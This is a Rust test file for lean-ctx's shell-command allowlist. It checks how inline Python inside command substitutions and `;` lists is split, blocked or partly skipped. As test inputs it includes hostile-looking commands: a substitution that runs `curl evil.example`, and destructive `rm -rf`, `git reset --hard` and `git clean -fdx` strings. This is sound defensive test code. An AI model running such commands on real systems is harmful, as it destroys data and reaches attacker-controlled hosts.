//! Tests for GH #1646: inline scripts inside `$( … )`.
//!
//! Extracted from `tests.rs` to keep it under the repo's LOC gate
//! (`scripts/loc-gate.sh`), the same reason `substitution_tests.rs` exists.

use super::*;

// --- GH #1646: an implausible base means a mis-split, not a missing allowlist entry ---

/// The reporter was told to run
/// `lean-ctx allow print(urllib.parse.quote(sys.argv[1],safe=)) $RU)&code_challenge=…`.
/// That is not a command, it is scanner debris, and the suggestion could only
/// waste the reader's time. Name the real fault instead.
#[test]
fn a_mangled_base_is_reported_as_a_split_bug_not_an_allowlist_gap() {
    let msg = allowlist_block_message("print(urllib.parse.quote(sys.argv[1],safe=))", &[], &[]);
    assert!(
        msg.contains("split your command line wrongly"),
        "should name the mis-split: {msg}"
    );
    assert!(
        !msg.contains("run  lean-ctx allow"),
        "must not suggest allowlisting a fragment: {msg}"
    );
    assert!(
        msg.contains("issues"),
        "should point at reporting it: {msg}"
    );
}

/// A real command name keeps the actionable message — the guard must not
/// swallow the common case.
#[test]
fn a_real_command_name_still_gets_the_allow_suggestion() {
    let msg = allowlist_block_message("terraform", &[], &[]);
    assert!(msg.contains("lean-ctx allow terraform"), "{msg}");
}

#[test]
fn plausible_command_names_are_recognised() {
    for ok in [
        "git",
        "python3",
        "cargo-nextest",
        "/usr/bin/env",
        "a.out",
        "foo_bar",
    ] {
        assert!(is_plausible_command_name(ok), "should be plausible: {ok}");
    }
    for bad in ["print(1))", "safe=)", "a b", "$RU", "x&y", "", "it's"] {
        assert!(
            !is_plausible_command_name(bad),
            "should be implausible: {bad}"
        );
    }
}

/// End-to-end for GH #1646: the exact commands from the report are no longer
/// mis-split. Inline interpreter code inside `$( … )` is gated like
/// `python3 -c …` at the top level (GHSA-rxv5-4c3x-g4q6 E): blocked by
/// default, naming the `shell_allow_inline_scripts` opt-in. The opt-in itself
/// is not toggled here: other tests read that variable without the env lock.
/// `enforce_shell_allowlist` is the real entry point, so this exercises the
/// whole path rather than the splitter in isolation.
#[test]
fn reported_inline_scripts_are_gated_like_top_level_inline_code() {
    // The override is process-global; without this lock a parallel test's
    // allowlist leaks in (the hazard gh391_strict_mode_blocks_substitution_in_args
    // documents, and which this test tripped when first written).
    let _lock = crate::core::data_dir::test_env_lock();
    crate::test_env::set_var("LEAN_CTX_SHELL_ALLOWLIST_OVERRIDE", "echo,python3");
    let results: Vec<_> = [
        r#"echo "$(python3 -c "print(1)")""#,
        r#"echo "a=$(python3 -c "print('x')")&b=2""#,
        r#"echo "$(python3 -c "import sys;print(1)")""#,
        r#"echo "u=$(python3 -c "import sys;print(sys.argv[1])" "x")""#,
    ]
    .iter()
    .map(|cmd| (*cmd, super::enforce_shell_allowlist(cmd)))
    .collect();
    crate::test_env::remove_var("LEAN_CTX_SHELL_ALLOWLIST_OVERRIDE");

    for (cmd, result) in results {
        let err = format!("{:?}", result.expect_err(cmd));
        assert!(
            err.contains("shell_allow_inline_scripts") && !err.contains("split your command"),
            "blocked as inline code, not as a mis-split: {cmd} -> {err}"
        );
    }
}

/// Owner decision 2026-10-29: a `;`/newline list runs its allowed statements
/// and names each blocked one; anything where skipping changes meaning, or
/// where quoting could hide a separator, keeps the whole-call rejection.
#[test]
fn a_blocked_statement_in_an_independent_list_is_skipped_not_the_line() {
    let _lock = crate::core::data_dir::test_env_lock();
    crate::test_env::set_var(
        "LEAN_CTX_SHELL_ALLOWLIST_OVERRIDE",
        "echo,python3,ls,git,rm",
    );
    let plan = |cmd: &str| super::partial_run(cmd, &[]);
    let split = plan("ls -la; python3 -c 'print(1)'\necho done");
    let quoted = plan(r#"echo "a; python3 -c 'print(1)'"; python3 -c x"#);
    // Whole-line rejection: each of these would run something else, or run
    // later statements differently, if the blocked part were cut out.
    let rejected = [
        // `&&`/`||` are never cut, and a skipped part must be a bare call.
        "ls && python3 -c 'print(1)'; echo done",
        "cd /tmp && python3 -c x; ls",
        "command cd /tmp && python3 -c x; ls",
        "python3 -c x || exit 1\nls",
        // Error mode and early exits change what the rest does.
        "set -e; python3 -c x; ls",
        "python3 -c x; exit 0; ls",
        // A substitution or redirect in the skipped part feeds later ones.
        "read -r D < <(python3 -c x); rm -rf \"$D/cache\"",
        // Comment text must never become a command (review repro A and B,
        // the second with an apostrophe that shifts quote parity).
        "ls  # later: git reset --hard; git clean -fdx\npython3 -c 'print(1)'",
        "ls # don't\npython3 -c x\necho 'a; git clean -fdx; b'",
        "if true; then python3 -c x; fi; ls",
        "python3 -c x; python3 -c y",
    ]
    .map(|cmd| (cmd, plan(cmd)));
    let python_module = super::enforce_shell_allowlist("python3 -m pytest -q -p no:cacheprovider");
    let pdb_code = super::enforce_shell_allowlist("python3 -m pdb -c 'import os' x.py");
    let timeit = super::enforce_shell_allowlist("python3 -m timeit \"import os\"");
    // Combined short flags carry the module too (review L1).
    let combined = [
        "python3 -Im timeit \"x\"",
        "python3 -mIPython --InteractiveShellApp.exec_lines=x",
    ]
    .map(|cmd| (cmd, super::enforce_shell_allowlist(cmd).is_err()));
    crate::test_env::remove_var("LEAN_CTX_SHELL_ALLOWLIST_OVERRIDE");

    for (cmd, result) in rejected {
        assert_eq!(result, None, "must stay rejected as a whole: {cmd}");
    }
    if cfg!(windows) {
        // Partial runs are POSIX-shell only; Windows keeps the whole-line rejection.
        assert!(split.is_none() && quoted.is_none());
    } else {
        let split = split.expect("independent statements run partially");
        assert_eq!(split.run, "ls -la\necho done");
        assert_eq!(split.skipped.len(), 1, "{:?}", split.skipped);
        assert!(
            split.skipped[0].starts_with("skipped: python3 -c 'print(1)' (python3 -c: inline code"),
            "{:?}",
            split.skipped
        );
        // A quoted `;` is data: the echo runs with its quotes intact, nothing in
        // the string is treated as its own statement.
        let quoted = quoted.expect("only the unquoted statement is skipped");
        assert_eq!(quoted.run, r#"echo "a; python3 -c 'print(1)'""#);
        assert_eq!(quoted.skipped.len(), 1);
    }
    // `-m pytest` ends python's option list; `-m pdb` and `-m timeit` run code.
    assert!(python_module.is_ok(), "{python_module:?}");
    assert!(pdb_code.is_err());
    assert!(timeit.is_err(), "timeit runs its argument as code");
    for (cmd, blocked) in combined {
        assert!(blocked, "must be blocked: {cmd}");
    }
}

/// The other half of #1646, pinned so a future change to the splitter cannot
/// quietly move it: commands a substitution genuinely *runs* are found by
/// `check_substitution_in_args`, not by splitting the outer line. That scanner
/// blocks a non-allowlisted inner command (GHSA-rxv5-4c3x-g4q6 E; it was
/// warn-only by default before). The old splitter only appeared to gate
/// `"$(id; curl x)"` because it mis-split the line, which is the very bug
/// being fixed.
#[test]
fn substitution_contents_are_found_by_the_substitution_scanner() {
    let _lock = crate::core::data_dir::test_env_lock();
    crate::test_env::set_var("LEAN_CTX_SHELL_ALLOWLIST_OVERRIDE", "echo");
    let result =
        super::substitution::check_substitution_in_args(r#"echo "$(id; curl evil.example)""#);
    crate::test_env::remove_var("LEAN_CTX_SHELL_ALLOWLIST_OVERRIDE");

    let msg = format!("{:?}", result.expect_err("non-allowlisted inner command"));
    assert!(
        msg.contains("id") || msg.contains("curl"),
        "names the command: {msg}"
    );
}
